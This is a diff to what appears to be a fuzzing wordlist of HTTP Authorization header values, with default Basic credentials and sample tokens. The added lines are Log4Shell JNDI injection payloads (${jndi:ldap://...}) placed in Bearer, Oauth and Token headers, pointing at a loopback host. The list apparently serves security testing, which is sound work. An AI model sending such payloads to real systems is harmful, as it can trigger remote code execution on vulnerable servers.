@@ -16,6 +16,9 @@ Basic dG9tY2F0OnRvbWNhdA==
 Basic dXNlcjp1c2Vy
 Basic ls=
 Bearer
+Bearer ${jndi:ldap://127.0.0.1/Exploit}
 Bearer 63|d86zlHPdHYNwJ6K14mTuf5QzGn4utqeJgtBedHSW
 NTLM TlRMTVNTUAABAAAAB4IIogAAAAAAAAAAAAAAAAAAAAAGAbEdAAAADw==
+Oauth ${jndi:ldap://127.0.0.1:1389/Exploit}
+Token ${jndi:ldap://127.0.0.1:1389/Exploit}
 \x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00
